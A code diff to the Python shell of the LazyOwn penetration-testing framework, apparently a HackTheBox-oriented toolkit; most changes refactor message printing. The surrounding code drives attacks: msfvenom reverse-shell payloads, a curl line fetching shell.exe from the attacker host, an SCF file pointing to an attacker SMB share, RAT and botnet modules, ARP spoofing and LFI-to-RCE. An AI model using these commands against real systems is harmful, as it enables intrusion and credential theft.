@@ -29,9 +29,25 @@ import json
 import time
 from cmd import Cmd
 
+def print_error(error):
+    """ funcion para imprimir un error"""
+    print(f"    {YELLOW}[-]{RED} {error}{RESET} [☠]")
+    return
+
+def print_msg(msg):
+    """ funcion para imprimir un msg"""
+    print(f"    {GREEN}[+]{WHITE} {msg}{RESET} [👽]")
+    return
+
+def print_warn(warn):
+    """ funcion para imprimir un warn"""
+    print(f"    {MAGENTA}[~]{YELLOW} {warn}{RESET} [⚠]")
+    return
+
+
 def signal_handler(sig, frame):
     global should_exit
-    print(f"\n{RED}    [<-]{YELLOW} para salir usar el comando{GREEN} exit, q or qa ...{RESET}")
+    print_warn(f"{RED}{YELLOW} para salir usar el comando{GREEN} exit, q or qa ...{RESET}")
     should_exit = True
     return
 
@@ -44,7 +60,7 @@ def is_binary_present(binary_name):
 # Verificar y relanzar con sudo si es necesario
 def check_sudo():
     if os.geteuid() != 0:
-        print("[S] Este script necesita permisos de superusuario. Relanzando con sudo...")
+        print_warn("Este script necesita permisos de superusuario. Relanzando con sudo...")
         args = ['sudo', sys.executable] + sys.argv
         os.execvpe('sudo', args, os.environ)
 
@@ -52,7 +68,7 @@ def check_sudo():
 def activate_virtualenv(venv_path):
     # Ejecutar el shell interactivo con el entorno virtual activado
     process = subprocess.Popen(
-        ["bash", "-c", f"source {venv_path}/bin/activate && exec bash"],
+    ["bash", "-c", f"source {venv_path}/bin/activate && exec bash"],
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
@@ -61,7 +77,7 @@ def activate_virtualenv(venv_path):
 
     # Captura la salida del proceso hijo
     stdout, stderr = process.communicate()
-    print(f"    {GREEN}[+] Entorno Activado.{RESET}")
+    print_msg(f"Entorno Activado.{RESET}")
 
 def parse_proc_net_file(file_path):
     ports = []
@@ -85,9 +101,9 @@ def parse_proc_net_file(file_path):
             
             ports.append((ip_address, port))
     except FileNotFoundError:
-        print(f"    {RED}[-] File {file_path} not found{RESET}")
+        print_error(f"File {file_path} not found{RESET}")
     except Exception as e:
-        print(f"    {RED}[-] An error occurred: {e}{RESET}")
+        print_error(f"An error occurred: {e}{RESET}")
     
     return ports
 
@@ -107,11 +123,11 @@ def find_credentials(directory):
                     content = f.read()
                     matches = regex.findall(content)
                     if matches:
-                        print(f"    [+] Credenciales encontradas en {os.path.join(root, file)}:")
+                        print_msg(f"Credenciales encontradas en {os.path.join(root, file)}:")
                         for match in matches:
-                            print(f"    [+] {match}")
+                            print_msg(f"{match}")
             except Exception as e:
-                print(f"    [-] No se pudo leer el archivo {file}: {e}")
+                print_error(f"No se pudo leer el archivo {file}: {e}")
 
 
 
@@ -136,8 +152,8 @@ BANNER = """
     ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
     ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
             ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
-    [*] Iniciando: Framework [;,;] """
-NOBANNER = False
+[⚠] Iniciand👽: Framew☠rk [;,;] """
+
 version = "v0.0.12"
 # Definimos algunos códigos de escape ANSI para colores
 RESET = "\033[0m"
@@ -165,7 +181,10 @@ BG_BLUE = "\033[44m"
 BG_MAGENTA = "\033[45m"
 BG_CYAN = "\033[46m"
 BG_WHITE = "\033[47m"
-
+# Variables de control
+NOBANNER = False
+COMMAND = None
+RUN_AS_ROOT = False
 # sys.argv es una lista que contiene los argumentos de la línea de comandos
 arguments = sys.argv[1:]  # Omitir el primer elemento que es el nombre del script
 
@@ -183,26 +202,28 @@ for arg in arguments:
         sys.exit(0)
         
     elif arg == '-v':
-        print(f"    {GREEN} LazyOwn Framework: {version}{RESET}")
+        print_msg(f"LazyOwn Framework: {version}")
         sys.exit(0)
 
     elif arg == '--no-banner':
         NOBANNER = True
     
     elif arg == '-s':
-        check_sudo()
+        RUN_AS_ROOT = True
 
     elif arg.startswith('-c'):
-        print(f"    {GREEN}[*] Ejecutando comando {arg}{RESET}")
+        print_msg(f"Ejecutando comando {arg}")
         break
     else:
-        print(f"Argumento no reconocido: {arg}") 
+        print_error(f"Argumento no reconocido: {arg}") 
         sys.exit(2) 
-
+# Ejecutar las acciones en base a los flags
+if RUN_AS_ROOT:
+    check_sudo()
 
 class LazyOwnShell(Cmd):
     prompt = f"{WHITE}LazyOwn{BLINK}{GREEN}>{RESET} "
-    if NOBANNER is True:
+    if NOBANNER:
         intro = ""
     else:    
         intro = f"""    {YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BLUE}{version} {WHITE}interactive s{RED}H{WHITE}ell! Type ? to list commands{BLUE}
@@ -213,7 +234,7 @@ class LazyOwnShell(Cmd):
     {GREEN}[+] hackTheBox: {BLUE}{UNDERLINE}https://app.hackthebox.com/teams/overview/6429 {RESET}
         """
     activate_virtualenv('env')
-    os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }'")                
+    
     # Diccionario para almacenar alias
     aliases = {
         'auto': 'pyautomate',
@@ -306,7 +327,7 @@ class LazyOwnShell(Cmd):
             "lazywerkzeugdebug",
         ]
         self.output = ""
-    
+        
     #def postcmd(self, stop, line):
         # Esto se ejecuta después de cada comando
         #self.display_status()
@@ -315,7 +336,7 @@ class LazyOwnShell(Cmd):
     #def display_status(self):
         # Aquí es donde puedes personalizar el string que deseas mostrar en el lado opuesto al prompt
         #output = subprocess.getoutput(
-        #    "ip a show tun0 2>/dev/null | awk '/inet / { split($2, a, \"/\"); print \"[\\033[96mtun0\\033[0m]\" a[1] }' || ip a show scope global | awk '/^[0-9]+:/ { sub(/:/, \"\", $2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\\033[96m\" iface \"\\033[0m] \" a[1] }'"
+        #    "ip a show tun0 2>/dev/null | awk '/inet / { split($2, a, \"/\"); print \"[\\033[96mtun0\\033[0m]\" a[1] }' || ip a show scope global | awk '/^[0-9]+:/ { sub(/:/, \"\", $2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\\033[96m\" iface \"\\033[0m] \" a[1] }'"
         #)
         #status_string = f"{BLINK}☠{RESET}{output}@"
         
@@ -336,7 +357,7 @@ class LazyOwnShell(Cmd):
         if hasattr(self, method_name):
             return getattr(self, method_name)(cmd_args)
         else:
-            print(f"    {GREEN}[?] {YELLOW} Not Found {BLUE}{line}{RESET}")
+            print_error(f"{YELLOW} Not Found {BLUE}{line}{RESET}")
 
     def one_cmd(self, command):
         self.output = self.get_output
@@ -351,20 +372,20 @@ class LazyOwnShell(Cmd):
         """Set a parameter value. Usage: set <parameter> <value>"""
         args = shlex.split(line)
         if len(args) != 2:
-            print(f"    {YELLOW}[?] Usage: set <parameter> <value>{RESET}")
+            print_error(f"{YELLOW} Usage: set <parameter> <value>{RESET}")
             return
 
         param, value = args
         if param in self.params:
             self.params[param] = value
-            print(f"    {GREEN}[SET] {YELLOW}{param} set to {GREEN}{value} {RESET}")
+            print_msg(f"{YELLOW}{param} set to {GREEN}{value} {RESET}")
         else:
-            print(f"    {RED}[?] Unknown parameter: {param}{RESET}")
+            print_error(f"Unknown parameter: {param}{RESET}")
 
     def do_show(self, line):
         """Show the current parameter values"""
         for param, value in self.params.items():
-            print(f"    [-] {param}: {value}")
+            print_msg(f"{param}: {value}")
 
     def do_list(self, line):
         """List all available scripts in modules directory, they can use apart from the framework too."""
@@ -372,7 +393,7 @@ class LazyOwnShell(Cmd):
         num_columns = 3
         
         if not scripts:
-            print(f"    {RED}[-]No available scripts.{RESET}")
+            print_error(f"No available scripts.{RESET}")
             return
         
         # Calcular el ancho máximo para cada columna
@@ -383,7 +404,7 @@ class LazyOwnShell(Cmd):
         rows = [scripts[i:i + num_columns] for i in range(0, len(scripts), num_columns)]
         
         # Mostrar los resultados en columnas
-        print(f"    {GREEN}[+]{YELLOW}Available scripts to run:{RESET}  \n")
+        print_msg(f"Available scripts to run:{RESET}")
         for row in rows:
             # Crear una fila con los elementos ajustados al ancho de columna
             print(f"   ".join(f"{script.ljust(column_width)}{RESET}    " for script in row))
@@ -392,19 +413,19 @@ class LazyOwnShell(Cmd):
         """Run a specific LazyOwn script to see all scripts to run see: list or help list"""
         args = shlex.split(line)
         if not args:
-            print(f"    {YELLOW}[?] Usage: {GREEN} run <script_name> {RESET}")
+            print_error(f"Usage: {GREEN} run <script_name> {RESET}")
             return
 
         script_name = args[0]
         if script_name in self.scripts:
             getattr(self, f"run_{script_name}")()
         else:
-            print(f"    {YELLOW}[?] Unknown script: {RED}{script_name}{RESET}")
+            print_error(f"Unknown script: {CYAN}{script_name}{RESET}")
 
     def run_lazysearch(self):
         binary_name = self.params["binary_name"]
         if not binary_name:
-            print("    [?] binary_name not set")
+            print_error("binary_name not set")
             return
         self.run_script("modules/lazysearch.py", binary_name)
 
@@ -421,7 +442,7 @@ class LazyOwnShell(Cmd):
         path = os.getcwd()
         target_ip = self.params["rhost"]
         if not target_ip:
-            print(f"    {RED}[?]{YELLOW} rhost must be set, {GREEN}help set to more info {RESET}")
+            print_error(f"rhost must be set, {GREEN}help set to more info {RESET}")
             return
         os.system(f"{path}/modules/lazynmap.sh -t {target_ip}")
 
@@ -432,9 +453,7 @@ class LazyOwnShell(Cmd):
         rport = self.params["rport"]
         lport = self.params["lport"]
         if not rhost or not lhost or not lport or not rport:
-            print(
-                "   [-] rhost, lhost, rpor, and lport must be set, to more info see: help set"
-            )
+            print_error("rhost, lhost, rpor, and lport must be set, to more info see: help set")
             return
         self.run_script("modules/lazywerkzeug.py", rhost, rport, lhost, lport)
         return
@@ -453,7 +472,7 @@ class LazyOwnShell(Cmd):
         env["TERM"] = "xterm-256color"
         device = self.params["device"]
         subprocess.run(
-            ["python3", "modules/lazysniff.py", "-i", device],
+        ["python3", "modules/lazysniff.py", "-i", device],
             env=env,
             stdin=sys.stdin,
             stdout=sys.stdout,
@@ -466,7 +485,7 @@ class LazyOwnShell(Cmd):
         env["LANG"] = "en_US.UTF-8"
         env["TERM"] = "xterm-256color"
         if not device:
-            print("    [-] device must be set to choice the interface")
+            print_error("device must be set to choice the interface")
             return
         subprocess.run(["python3", "modules/lazyftpsniff.py", "-i", device])
 
@@ -497,7 +516,7 @@ class LazyOwnShell(Cmd):
         prompt = self.params["prompt"]
         api_key = self.params["api_key"]
         if not prompt or not api_key:
-            print("    [?] prompt and api_key must be set")
+            print_error("Prompt and api_key must be set")
             return
         os.environ["GROQ_API_KEY"] = api_key
         self.run_script("modules/lazygptcli.py", "--prompt", prompt)
@@ -506,7 +525,7 @@ class LazyOwnShell(Cmd):
         prompt = self.params["prompt"]
         api_key = self.params["api_key"]
         if not prompt or not api_key:
-            print("    [?] prompt and api_key must be set")
+            print_error("Prompt and api_key must be set")
             return
         os.environ["GROQ_API_KEY"] = api_key
         self.run_script("modules/lazysearch_bot.py", "--prompt", prompt)
@@ -514,7 +533,7 @@ class LazyOwnShell(Cmd):
     def run_lazymetaextract0r(self):
         path = self.params["path"]
         if not path:
-            print("    [?] path must be set")
+            print_error("Path must be set")
             return
         self.run_script("modules/lazyown_metaextract0r.py", "--path", path)
 
@@ -523,7 +542,7 @@ class LazyOwnShell(Cmd):
         lport = self.params["lport"]
         rat_key = self.params["rat_key"]
         if not lhost or not lport or not rat_key:
-            print("    [?] lhost and lport and rat_key must be set")
+            print_error("lhost and lport and rat_key must be set")
             return
         self.run_script(
             "modules/lazyownclient.py",
@@ -540,7 +559,7 @@ class LazyOwnShell(Cmd):
         rport = self.params["rport"]
         rat_key = self.params["rat_key"]
         if not rhost or not rport or not rat_key:
-            print("    [?] rhost and lport and rat_key must be set")
+            print_error("rhost and lport and rat_key must be set")
             return
         self.run_script(
             "modules/lazyownserver.py",
@@ -557,7 +576,7 @@ class LazyOwnShell(Cmd):
         rport = self.params["rport"]
         rat_key = self.params["rat_key"]
         if not rhost or not rport or not rat_key:
-            print("    [?] rhost and lport and rat_key must be set")
+            print("rhost and lport and rat_key must be set")
             return
         self.run_script(
             "modules/lazybotnet.py",
@@ -585,7 +604,7 @@ class LazyOwnShell(Cmd):
             or not field
             or not wordlist
         ):
-            print("    [?] rhost and rport field and lhost lport wordlist must be set")
+            print("rhost and rport field and lhost lport wordlist must be set")
             return
         self.run_script(
             "modules/lazylfi2rce.py",
@@ -608,7 +627,7 @@ class LazyOwnShell(Cmd):
         lhost = self.params["lhost"]
 
         if not rhost or not lhost:
-            print("     [?] rhost and lhost must be set")
+            print(" rhost and lhost must be set")
             return
         self.run_script(
             "modules/lazylogpoisoning.py", "--rhost", rhost, "--lhost", lhost
@@ -619,7 +638,7 @@ class LazyOwnShell(Cmd):
         rport = self.params["rport"]
         rat_key = self.params["rat_key"]
         if not rhost or not rport or not rat_key:
-            print("     [?] rhost and lport and rat_key must be set")
+            print(" rhost and lport and rat_key must be set")
             return
         self.run_script(
             "modules/lazybotcli.py",
@@ -638,7 +657,7 @@ class LazyOwnShell(Cmd):
             print("     rhost and wordlist must be set")
             return
         print(
-            "   [?] this may not be accurate. using a version a little bit updated from searchsploit"
+            "   this may not be accurate. using a version a little bit updated from searchsploit"
         )
         path = os.getcwd()
         os.system(f"{path}/modules/lazybrutesshuserenum.sh {wordlist} {rhost}")
@@ -702,7 +721,7 @@ class LazyOwnShell(Cmd):
         path = os.getcwd()
         if not ip or not port:
             print(
-                "    [?] rhost and reverse_shell_port must be set, more info see, help set"
+                "rhost and reverse_shell_port must be set, more info see, help set"
             )
             return
         os.system(f"{path}/modules/lazyreverse_shell.sh --ip {ip} --puerto {port}")
@@ -712,7 +731,7 @@ class LazyOwnShell(Cmd):
         rhost = self.params["rhost"]
         device = self.params["device"]
         if not lhost or not rhost or not device:
-            print("    [?] lhost, lhost, and device must be set")
+            print("lhost, lhost, and device must be set")
             return
         os.system(f"modules/lazyarpspoofing.py --device {device} {lhost} {rhost}")
 
@@ -722,7 +741,7 @@ class LazyOwnShell(Cmd):
         target_ip = self.params["rhost"]
         attacker_ip = self.params["lhost"]
         if not mode or not target_ip or not attacker_ip:
-            print("    [?] mode, rhost, and lhost must be set, more info see help set")
+            print("mode, rhost, and lhost must be set, more info see help set")
             return
         os.system(
             f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}"
@@ -733,7 +752,7 @@ class LazyOwnShell(Cmd):
         lport = self.params["lport"]
         path = os.getcwd()
         if not lhost or not lport:
-            print("    [?] lport and lhost mus be set")
+            print("lport and lhost mus be set")
             return
         os.system(
             f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf'
@@ -766,7 +785,7 @@ class LazyOwnShell(Cmd):
         os.system("upx sessions/shell64.macho")
         os.system("upx sessions/shell64.exe")        
         os.system(f"echo 'curl http://{lhost}/shell.exe -o s.exe' | xclip -sel clip")
-        print(f"    {YELLOW}[?] To run web server exec command: {GREEN}www {YELLOW}or {GREEN}lazywebshell {RED}[;,;] curl -o s.exe http://{lhost}/shell.exe copy to clipboard :D {RESET}")
+        print(f"    {YELLOW}To run web server exec command: {GREEN}www {YELLOW}or {GREEN}lazywebshell {RED}[;,;] curl -o s.exe http://{lhost}/shell.exe copy to clipboard :D {RESET}")
         return
 
     def run_lazyaslrcheck(self):
@@ -785,7 +804,7 @@ class LazyOwnShell(Cmd):
     def run_lazypathhijacking(self):
         binary_name = self.params["binary_name"]
         if not binary_name:
-            print("    [?] binary_name must be set")
+            print("binary_name must be set")
             return
         os.system(f"echo {binary_name} >> modules/tmp.sh")
         os.system(f"cp modules/tmp.sh /tmp/{binary_name}")
@@ -830,14 +849,14 @@ class LazyOwnShell(Cmd):
                     self.params[key] = value
             print(f"    {YELLOW}[*] Parameters loaded from{GREEN} payload.json{RESET}")
         except FileNotFoundError:
-            print("    [?] payload.json not found")
+            print("payload.json not found")
         except json.JSONDecodeError:
-            print("    [?] Error decoding payload.json")
+            print("Error decoding payload.json")
 
     def do_exit(self, arg):
         """Exit the command line interface."""
         # Si deseas, puedes implementar confirmación aquí
-        confirm = input(f"{YELLOW}[?] ¿Seguro que quieres salir? {GREEN}(s/n): {RESET}").strip().lower()
+        confirm = input(f"{YELLOW}¿Seguro que quieres salir? {GREEN}(s/n): {RESET}").strip().lower()
         if confirm == 's':
             print(f'{RED}[->] Saliendo ...{RESET}')
             sys.exit(0)
@@ -847,14 +866,14 @@ class LazyOwnShell(Cmd):
 
     def do_fixperm(self, line):
         """Fix Perm LazyOwn shell"""
-        print("    [f] Fix script perm")
+        print("[f] Fix script perm")
         os.system("chmod +x modules/*.sh")
         os.system("chmod +x modules/cgi-bin/*")
         return
 
     def do_lazywebshell(self, line):
         """LazyOwn shell"""
-        print("    [r] Running Server in localhost:8888/cgi-bin/lazywebshell.py")
+        print("[r] Running Server in localhost:8888/cgi-bin/lazywebshell.py")
         os.system("cd modules && python3 -m http.server 8888 --cgi &")
         return
 
@@ -874,7 +893,7 @@ class LazyOwnShell(Cmd):
     def do_smbclient(self, line):
         """Lazy SMBCLient"""
         if not self.params["rhost"]:
-            print("    [?] rhost must be set")
+            print("rhost must be set")
             return
         rhost = self.params["rhost"]
         if line:
@@ -883,7 +902,7 @@ class LazyOwnShell(Cmd):
             return
         print(f"    {GREEN}[*] perform this command: smbclient -N -L \\\\{rhost}\\ {RESET}")
         os.system(f"smbclient -N -L \\\\{rhost}\\")
-        print('    [?] exploit smb if is posible mount -t cifs "//10.10.10.10/documetns share" /mnt/smb ')
+        print('exploit smb if is posible mount -t cifs "//10.10.10.10/documetns share" /mnt/smb ')
         return
 
     def do_smbmap(self, line):
@@ -893,24 +912,24 @@ class LazyOwnShell(Cmd):
             print("rhost must be set, see help set, ex: set rhost 10.10.10.3 ")
             return
         if not line:
-            print(f"    [*] Try... smbmap -H {rhost} -u 'deefbeef'")
+            print(f"[*] Try... smbmap -H {rhost} -u 'deefbeef'")
             os.system(f"smbmap -H {rhost} -u 'deefbeef'")
             return
-        print(f"    [*] try... smbmap -H {rhost} -R {line}")
+        print(f"[*] try... smbmap -H {rhost} -R {line}")
         os.system(f"smbmap -H {rhost} -R {line}")
-        print('    [?] exploit smb if is posible mount -t cifs "//10.10.10.10/documetns share" /mnt/smb ')
+        print('exploit smb if is posible mount -t cifs "//10.10.10.10/documetns share" /mnt/smb ')
         return
     def do_getnpusers(self, line):        
         """sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile sessions/users.txt"""
         if not line:
-            print("    [-] you must pass the domain by argument ex: getnpusers domain.com more info help getnpusers")
+            print("[-] you must pass the domain by argument ex: getnpusers domain.com more info help getnpusers")
             return
         os.system(f"sudo impacket-GetNPUsers {line}/ -no-pass -usersfile sessions/users.txt")
         return
     def do_psexec(self, line):
         """Lazy impacket-psexec administrator@"""
         if not self.params["rhost"]:
-            print("    [?] rhost must be set")
+            print("rhost must be set")
             return
         rhost = self.params["rhost"]
         os.system(f"impacket-psexec administrator@{rhost}")
@@ -932,10 +951,10 @@ class LazyOwnShell(Cmd):
         rhost = self.params["rhost"]
         if not line or not rhost:
             print(
-                "    [-] rhost must be set or you must pass the dns argument like dig box.htb"
+                "[-] rhost must be set or you must pass the dns argument like dig box.htb"
             )
             return
-        print(f"    [+]{GREEN} Try dig version.bind CHAOS TXT @{line} {RESET}")
+        print(f"[+]{GREEN} Try dig version.bind CHAOS TXT @{line} {RESET}")
         os.system(f"dig version.bind CHAOS TXT @{line}")
         print(f"    dig any {line} @{rhost}")
         os.system(f"dig any {line} @{rhost}")
@@ -975,7 +994,7 @@ class LazyOwnShell(Cmd):
         rhost = self.params["rhost"]
         dnswordlist = self.params["dnswordlist"]
         if not line or not dnswordlist:
-            print(f"    {YELLOW}[?] dnswordlist must be set example: set dnswordlist path/to/wordlist or you need pass the domain {RESET}")
+            print(f"    {YELLOW}dnswordlist must be set example: set dnswordlist path/to/wordlist or you need pass the domain {RESET}")
             return
         print(
             f"    {GREEN}[+] Try ... dnsmap {line} -w {dnswordlist} {RESET}"
@@ -988,7 +1007,7 @@ class LazyOwnShell(Cmd):
     def do_whatweb(self, line):
         """whatweb"""
         if not self.params["rhost"]:
-            print(f"    {YELLOW}[?] rhost must be set{RESET}")
+            print(f"    {YELLOW}rhost must be set{RESET}")
             return
         rhost = self.params["rhost"]
         print(f"    {GREEN}[+] Try... whatweb {rhost}{RESET}")
@@ -997,7 +1016,7 @@ class LazyOwnShell(Cmd):
     def do_enum4linux(self, line):
         """enum4linux -a target"""
         if not self.params["rhost"]:
-            print("    [?] rhost must be set")
+            print("rhost must be set")
             return
         rhost = self.params["rhost"]
         print(f"    {GREEN}[+] Try... enum4linux -a {rhost} {RESET}")
@@ -1007,7 +1026,7 @@ class LazyOwnShell(Cmd):
     def do_nbtscan(self, line):
         """sudo nbtscan -r target"""
         if not self.params["rhost"]:
-            print(f"    {YELLOW}[?] rhost must be set{RESET}")
+            print(f"    {YELLOW}rhost must be set{RESET}")
             return
         rhost = self.params["rhost"]
         print(f"    {GREEN}[+] Try... sudo nbtscan -r {rhost}/24 {RESET}")
@@ -1017,7 +1036,7 @@ class LazyOwnShell(Cmd):
     def do_rpcclient(self, line):
         """rpcclient -U "" -N 10.10.10.10"""
         if not self.params["rhost"]:
-            print(f"    {YELLOW}[?] rhost must be set{RESET}")
+            print(f"    {YELLOW}rhost must be set{RESET}")
             return
         rhost = self.params["rhost"]
         print(f"    {GREEN}[+] Try... rpcclient -U '' -N {rhost} {RESET}")
@@ -1027,7 +1046,7 @@ class LazyOwnShell(Cmd):
     def do_nikto(self, line):
         """nikto -h 10.10.10.10"""
         if not self.params["rhost"]:
-            print("    [?] rhost must be set")
+            print("rhost must be set")
             return
         rhost = self.params["rhost"]
         print(f"    {GREEN}[+] Try nikto -h {rhost} {RESET}")
@@ -1037,7 +1056,7 @@ class LazyOwnShell(Cmd):
     def do_openssl_sclient(self, line):
         """openssl s_client -connect  10.10.10.10"""
         if not self.params["rhost"] or not line:
-            print("    [?] rhost must be set and you need pass the port by argument ex: openssl_sckient 443")
+            print("rhost must be set and you need pass the port by argument ex: openssl_sckient 443")
             return
         rhost = self.params["rhost"]
         print(f"    {GREEN}[+] Try... openssl s_client -connect  {rhost}:{line} {RESET}")
@@ -1054,7 +1073,7 @@ class LazyOwnShell(Cmd):
         dirwordlist = self.params["dirwordlist"]
         rhost = self.params["rhost"]
         if not rhost or not dirwordlist:
-            print(f"    {YELLOW}[?] dirwordlist and rhost must be set{RESET}")
+            print(f"    {YELLOW}dirwordlist and rhost must be set{RESET}")
             return
 
         if line:
@@ -1079,7 +1098,7 @@ class LazyOwnShell(Cmd):
                 
                 dirwordlist = '/usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt'
                 if not os.path.exists(dirwordlist):
-                    print(f"    [-] you must have file {dirwordlist} use the command: getseclist")
+                    print(f"[-] you must have file {dirwordlist} use the command: getseclist")
                     return
                 # Abre el archivo en modo de lectura                
                 if count > 1:
@@ -1099,12 +1118,12 @@ class LazyOwnShell(Cmd):
         dirwordlist = self.params["dirwordlist"]
         rhost = self.params["rhost"]
         if not rhost or not dirwordlist:
-            print(f"    {YELLOW}[?] rhost and dirwordlist must be set {RESET}")
+            print(f"    {YELLOW}rhost and dirwordlist must be set {RESET}")
             return
         if line == "url":
             url = self.params["url"]
             if not url:
-                print(f"    {YELLOW}[?]  url must be set, ex: set url http://domain.ext {RESET}")
+                print(f"    {YELLOW} url must be set, ex: set url http://domain.ext {RESET}")
                 return
             print(f"    {GREEN}[+] Try gobuster dir --url {url}/ --wordlist {dirwordlist} {RESET}")
             os.system(f"gobuster dir --url {url}/ --wordlist {dirwordlist}")
@@ -1133,12 +1152,12 @@ class LazyOwnShell(Cmd):
         rhost = self.params["rhost"]
         if not rhost:
             print(
-                "    [-] add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
+                "[-] add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
             )
             return
-        print(f"    [+] Try... crackmapexec smb {rhost}")
+        print(f"[+] Try... crackmapexec smb {rhost}")
         os.system(f"crackmapexec smb {rhost}")
-        print(f"    [*] Done... crackmapexec smb {rhost}")
+        print(f"[*] Done... crackmapexec smb {rhost}")
         return
 
     def do_ldapdomaindump(self, line):
@@ -1146,12 +1165,12 @@ class LazyOwnShell(Cmd):
         rhost = self.params["rhost"]
         if not rhost or not line:
             print(
-                "    [-] add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
+                "[-] add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
             )
             return
         path_cred = "sessions/credentials.txt"
         if not os.path.exists(path_cred):
-            print("    [-] you must have file sessions/credentials.txt with this format: user:password")
+            print("[-] you must have file sessions/credentials.txt with this format: user:password")
             return
         # Abre el archivo en modo de lectura
         with open(path_cred, 'r') as file:
@@ -1169,12 +1188,12 @@ class LazyOwnShell(Cmd):
         rhost = self.params["rhost"]
         if not rhost:
             print(
-                "    [-] rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
+                "[-] rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
             )
             return
         path_cred = "sessions/credentials.txt"
         if not os.path.exists(path_cred):
-            print("    [-] you must have file sessions/credentials.txt with this format: user:password more help createcredentials")
+            print("[-] you must have file sessions/credentials.txt with this format: user:password more help createcredentials")
             return
         # Abre el archivo en modo de lectura
         with open(path_cred, 'r') as file:
@@ -1192,13 +1211,13 @@ class LazyOwnShell(Cmd):
         rhost = self.params["rhost"]
         if not rhost:
             print(
-                "    [-] add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
+                "[-] add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
             )
             return
-        print(f"    [+] try... ping -c 1 {rhost} ")
+        print(f"[+] try... ping -c 1 {rhost} ")
         # Ejecutar el comando ping y capturar la salida
         result = subprocess.run(
-            ["ping", "-c", "1", rhost], capture_output=True, text=True
+        ["ping", "-c", "1", rhost], capture_output=True, text=True
         )
 
         # Verificar la salida y determinar el sistema operativo basado en TTL
@@ -1210,7 +1229,7 @@ class LazyOwnShell(Cmd):
                     ttl_value = int(
                         result.stdout[ttl_index + 4 : ttl_index + 7]
                     )  # Obtener el valor de TTL
-                    print("    [+] TTL:", ttl_value)
+                    print("[+] TTL:", ttl_value)
 
                     # Determinar basado en el TTL
                     if ttl_value <= 60 or ttl_value <= 64:
@@ -1219,16 +1238,16 @@ class LazyOwnShell(Cmd):
                         print(f"    {GREEN}[*]Host activo {CYAN}probablemente es {RED}Windows{RESET}")
                     else:
                         print(
-                            "    [-] No se puede determinar con certeza el sistema operativo"
+                            "[-] No se puede determinar con certeza el sistema operativo"
                         )
                 else:
-                    print("    [-] No se encontró el TTL en la salida del ping")
+                    print("[-] No se encontró el TTL en la salida del ping")
 
             except ValueError:
-                print("    [-] No se pudo convertir el TTL a un número entero")
+                print("[-] No se pudo convertir el TTL a un número entero")
         else:
-            print("    [-] No se pudo realizar el ping al host")
-        print(f"    [*] Done... ping -c 1 {rhost} ")
+            print("[-] No se pudo realizar el ping al host")
+        print(f"[*] Done... ping -c 1 {rhost} ")
 
     def do_gospider(self, line):
         """try gospider"""
@@ -1237,7 +1256,7 @@ class LazyOwnShell(Cmd):
             url = self.params["url"]
             if not url:
                 print(
-                    "    [-] if you pass the param url, url mus be set, ex: set url http://url.ext"
+                    "[-] if you pass the param url, url mus be set, ex: set url http://url.ext"
                 )
                 return
 
@@ -1246,22 +1265,22 @@ class LazyOwnShell(Cmd):
             return
 
         if not rhost:
-            print("    [-] rhost must be set")
+            print("[-] rhost must be set")
             return
         if is_binary_present("gospider"):
-            print(f"    [+] try... gospider -s http://{rhost}")
+            print(f"[+] try... gospider -s http://{rhost}")
             os.system(f"gospider -s http://{rhost}")
         else:
-            print("    [*] gospider is not installed, installing... (control + c to cancel)")
+            print("[*] gospider is not installed, installing... (control + c to cancel)")
             os.system(f"sudo apt install gospider -y && gospider -s http://{rhost}")
 
     def do_arpscan(self, line):
         """try arp-scan"""
         if not self.params["device"]:
-            print("    [?] device must be set")
+            print("device must be set")
             return
         device = self.params["device"]
-        print("    [+] try to arp-scan sudo arp-scan -I DEVICE --localnet")
+        print("[+] try to arp-scan sudo arp-scan -I DEVICE --localnet")
         os.system(f"sudo arp-scan -I {device} --localnet")
 
     def do_lazypwn(self, line):
@@ -1279,19 +1298,19 @@ class LazyOwnShell(Cmd):
         lhost = self.params["lhost"]
 
         if not lhost:
-            print(f"    {YELLOW} [?] lhost must be set.{RESET}")
+            print(f"    {YELLOW} lhost must be set.{RESET}")
             return
         revshell = f"""[Shell]
         Command=2
         IconFile=\\\\\\\\{lhost}\\smbfolder\\icon.ico
-        [Taskbar]
+    [Taskbar]
         Command=ToggleDesktop
         """.replace('        ','')
-        print(f"    [*] Try... echo '{revshell}' > sessions/file.scf ")
+        print(f"[*] Try... echo '{revshell}' > sessions/file.scf ")
         os.system(f"echo '{revshell}' > sessions/file.scf ")
-        print(f"    [*] echo 'curl http://{lhost}/sessions/file.scf' |  xclip -sel clip")
-        print(f"    [*] command copied to clipboard")
-        print(f"    [*] trying sudo impacket-smbserver smbfolder $(pwd) -smb2support ...")
+        print(f"[*] echo 'curl http://{lhost}/sessions/file.scf' |  xclip -sel clip")
+        print(f"[*] command copied to clipboard")
